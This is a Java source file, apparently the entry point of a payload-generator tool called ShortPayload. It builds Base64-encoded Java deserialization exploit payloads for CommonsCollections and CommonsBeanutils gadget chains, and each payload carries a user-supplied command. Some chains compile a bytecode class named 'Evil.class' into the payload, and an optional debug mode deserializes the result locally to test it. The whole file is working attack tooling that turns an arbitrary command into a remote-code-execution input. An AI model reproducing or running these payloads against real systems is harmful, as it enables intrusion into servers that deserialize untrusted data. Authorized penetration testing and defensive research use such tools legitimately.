package org.sec;

import org.sec.asm.Resolver;
import org.sec.payload.*;

import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Locale;

public class Main {
    private static String gadgetName;
    private static String command;
    private static boolean debug = false;

    public static void main(String[] args) throws Exception {
        parseInput(args);
        switch (gadgetName) {
            case "CB1":
                System.out.println("CommonsBeanutils1");
                resolveTemplatesPayload(CB1.class, command, debug);
                break;
            case "CC1":
                System.out.println("CommonsCollections1");
                resolveNormalPayload(CC1.class, command, debug);
                break;
            case "CC2":
                System.out.println("CommonsCollections2");
                resolveTemplatesPayload(CC2.class, command, debug);
                break;
            case "CC3":
                System.out.println("CommonsCollections3");
                resolveTemplatesPayload(CC3.class, command, debug);
                break;
            case "CC4":
                System.out.println("CommonsCollections4");
                resolveTemplatesPayload(CC4.class, command, debug);
                break;
            case "CC5":
                System.out.println("CommonsCollections5");
                resolveNormalPayload(CC5.class, command, debug);
                break;
            case "CC6":
                System.out.println("CommonsCollections6");
                resolveNormalPayload(CC6.class, command, debug);
                break;
            case "CC7":
                System.out.println("CommonsCollections7");
                resolveNormalPayload(CC7.class, command, debug);
                break;
            case "CCK1":
                System.out.println("CommonsCollectionsK1");
                resolveTemplatesPayload(CCK1.class, command, debug);
                break;
            case "CCK2":
                System.out.println("CommonsCollectionsK2");
                resolveTemplatesPayload(CCK2.class, command, debug);
                break;
            case "CCK3":
                System.out.println("CommonsCollectionsK3");
                resolveNormalPayload(CCK3.class, command, debug);
                break;
            case "CCK4":
                System.out.println("CommonsCollectionsK4");
                resolveNormalPayload(CCK4.class, command, debug);
                break;
            default:
                System.out.println("error gadget name");
        }
    }

    private static void parseInput(String[] args) {
        if (args.length < 2) {
            System.out.println("usage: java -jar ShortPayload.jar [gadget-name] [command]");
            return;
        } else if (args.length == 3) {
            gadgetName = args[0];
            command = args[1];
            debug = true;
        } else {
            gadgetName = args[0];
            command = args[1];
        }
        if ((command.startsWith("'") && command.endsWith("'")) ||
                (command.startsWith("\"") && command.endsWith("\""))) {
            command = command.substring(1, command.length() - 1);
        }
        gadgetName = gadgetName.toUpperCase(Locale.ROOT);
    }

    private static void resolveNormalPayload(Class<?> target,
                                             String command, boolean debug) throws Exception {
        Method method = target.getMethod("getPayloadUseCommand", String.class);
        byte[] payload = (byte[]) method.invoke(null, command);
        byte[] data = Base64.getEncoder().encode(payload);
        System.out.println("Payload length: " + new String(data).length());
        System.out.println("Write Base64 Payload output.txt...");
        Files.write(Paths.get("output.txt"), data);
        if (debug) {
            Payload.deserialize(Base64.getDecoder().decode(data));
        }
    }

    @SuppressWarnings("all")
    private static void resolveTemplatesPayload(Class<?> target,
                                                String command, boolean debug) throws Exception {
        String path = System.getProperty("user.dir") + File.separator + "Evil.class";
        Generator.saveTemplateImpl(path, command);
        Resolver.resolve("Evil.class");
        byte[] newByteCodes = Files.readAllBytes(Paths.get("Evil.class"));
        Method method = target.getMethod("getPayloadUseByteCodes", byte[].class);
        byte[] payload = Base64.getEncoder().encode((byte[]) method.invoke(null, newByteCodes));
        System.out.println("Payload length: " + new String(payload).length());
        System.out.println("Write Base64 Payload output.txt...");
        Files.write(Paths.get("output.txt"), payload);
        if (debug) {
            Payload.deserialize(Base64.getDecoder().decode(payload));
        }
        Files.delete(Paths.get("Evil.class"));
    }
}
